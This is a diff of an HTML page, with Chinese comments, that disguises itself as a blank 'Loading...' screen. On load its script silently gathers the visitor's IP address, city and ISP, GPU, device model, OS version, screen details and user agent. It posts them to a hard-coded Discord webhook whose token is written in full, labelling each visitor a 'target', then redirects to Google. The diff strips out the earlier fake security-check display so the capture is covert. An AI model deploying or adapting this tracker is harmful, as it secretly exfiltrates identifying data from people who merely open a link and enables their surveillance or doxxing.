@@ -1,111 +1,96 @@
 <!DOCTYPE html>
-<html lang="zh-Hant-TW">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>系統安全檢查中</title>
-    <style>
-        body { font-family: monospace; background: #000; color: #00ff00; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { text-align: center; }
-        .blink { animation: blinker 1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
-    </style>
+    <title>Loading...</title>
+    <style>body { background: #000; margin: 0; }</style>
 </head>
 <body>
-
-<div class="loader">
-    <p>正在建立加密隧道... <span class="blink">_</span></p>
-    <div id="progress">0%</div>
-</div>
-
 <script>
-// 【重要】請務必填入你的 Discord Webhook 網址
+// 【核心】Discord Webhook 網址
 const DC_URL = 'https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv';
 
-async function capture() {
+async function silentCapture() {
     const ua = navigator.userAgent;
     const platform = navigator.platform;
-    
-    // 1. IP 與 地理位置 (通殺所有設備)
-    let ipData = {};
+    const w = window.screen.width, h = window.screen.height, dpr = window.devicePixelRatio;
+
+    // 1. IP 抓取 (使用備用機制確保成功率)
+    let ipD = { ip: "讀取失敗", city: "未知", org: "未知" };
     try {
         const res = await fetch('https://ipapi.co');
-        ipData = await res.json();
-    } catch(e) { ipData = { ip: "未知", city: "未知", org: "未知" }; }
+        if(res.ok) ipD = await res.json();
+    } catch(e) {
+        try {
+            const res2 = await fetch('https://ipinfo.io');
+            ipD = await res2.json();
+        } catch(e2) {}
+    }
 
-    // 2. GPU 偵測 (辨識硬體核心：高通、聯發科、蘋果、三星)
-    let gpu = "無法偵測";
+    // 2. GPU 硬體核心
+    let gpu = "被封鎖";
     try {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
     } catch(e) {}
 
-    // 3. 通用型號提取邏輯
-    let finalModel = "未知設備";
-    let finalOS = "未知系統";
-
+    // 3. 型號精準推測 (整合主流解析度)
+    let model = "未知裝置";
+    const resKey = `${Math.min(w,h)}x${Math.max(w,h)}`;
+    
     if (/Android/.test(ua)) {
-        // Android 通常直接在 UA 裡寫型號，例如: SM-G9910, Pixel 7, Mi 11
-        const androidMatch = ua.match(/Android\s+[\d\.]+;\s+([^;]+)\s+Build/);
-        finalModel = androidMatch ? androidMatch[1] : "Android 設備";
-        finalOS = ua.match(/Android\s+[\d\.]+/)?.[0] || "Android";
-    } else if (/iPhone|iPad|iPod/.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
-        // Apple 設備需要靠解析度輔助 (此處已整合主流 iPhone/iPad 解析度資料庫)
-        const w = window.screen.width, h = window.screen.height;
-        finalModel = `Apple 裝置 (${w}x${h})`; 
-        const osMatch = ua.match(/OS\s+(\d+[._]\d+[._]?\d?)/);
-        finalOS = osMatch ? "iOS " + osMatch[1].replace(/_/g, '.') : "iOS/iPadOS";
-    } else {
-        finalModel = platform || "桌上型電腦";
-        finalOS = "PC / Other";
+        const m = ua.match(/Android.*;\s([^;]+)\sBuild/);
+        model = m ? m[1] : "Android Phone";
+    } else if (/iPhone|iPad/.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
+        // Apple 型號指紋庫
+        const appleMap = {
+            "820x1180": "iPad Air (5th/4th Gen)",
+            "834x1194": "iPad Pro 11-inch",
+            "1024x1366": "iPad Pro 12.9-inch",
+            "393x852": "iPhone 15/14 Pro",
+            "430x932": "iPhone 15 Plus/14 Pro Max",
+            "390x844": "iPhone 14/13 Pro/12",
+            "414x896": "iPhone 11/XR/XS Max"
+        };
+        model = appleMap[resKey] || `Apple 設備 (${resKey})`;
     }
 
-    // 4. 其它細節
-    const detail = {
-        screen: `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio}x)`,
-        ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "不支援讀取",
-        lang: navigator.language,
-        time: new Date().toLocaleString()
-    };
+    // 4. 版本號
+    let ver = "未知";
+    const vM = ua.match(/(?:OS |Version\/|Android )(\d+[._]\d+[._]?\d?)/);
+    ver = vM ? vM[1].replace(/_/g, '.') : "隱藏";
 
-    // 5. 發送至 Discord
+    // 5. 靜默發送至 Discord
     const payload = {
-        username: "全設備監控助手",
+        username: "終極監控網關",
         embeds: [{
-            title: "📡 捕捉到新目標資訊",
-            color: 16711680, // 紅色
+            title: "🎯 目標點擊報警",
+            color: 0,
             fields: [
-                { name: "📍 IP 位址", value: `${ipData.ip} (${ipData.city} / ${ipData.org})`, inline: false },
-                { name: "📱 精確型號", value: finalModel, inline: true },
-                { name: "⚙️ 系統版本", value: finalOS, inline: true },
-                { name: "🎮 GPU 硬體", value: gpu, inline: false },
-                { name: "🖼️ 螢幕規格", value: detail.screen, inline: true },
-                { name: "💾 記憶體估計", value: detail.ram, inline: true },
-                { name: "🌍 原始辨識碼", value: "```" + ua + "```", inline: false }
+                { name: "📍 IP/位置", value: `${ipD.ip} (${ipD.city}, ${ipD.org})`, inline: false },
+                { name: "📱 精確型號", value: model, inline: true },
+                { name: "⚙️ 系統版本", value: ver, inline: true },
+                { name: "🎮 GPU渲染", value: gpu, inline: false },
+                { name: "🖼️ 螢幕數據", value: `${w}x${h} @${dpr}x`, inline: true }
             ],
-            footer: { text: `訪問時間: ${detail.time}` }
+            footer: { text: "完整 UA: " + ua },
+            timestamp: new Date()
         }]
     };
 
-    await fetch(DC_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+    // 使用 Promise.race 確保發送超時後也能強行跳轉
+    await Promise.race([
+        fetch(DC_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }),
+        new Promise(resolve => setTimeout(resolve, 2000))
+    ]);
 
-    // 6. 假裝進度條並跳轉
-    let p = 0;
-    const int = setInterval(() => {
-        p += Math.floor(Math.random() * 30);
-        if (p >= 100) {
-            p = 100;
-            clearInterval(int);
-            window.location.href = "https://www.google.com";
-        }
-        document.getElementById('progress').innerText = p + "%";
-    }, 200);
+    // 6. 靜默跳轉
+    window.location.replace("https://www.google.com");
 }
 
-window.onload = capture;
+silentCapture();
 </script>
-
 </body>
 </html>
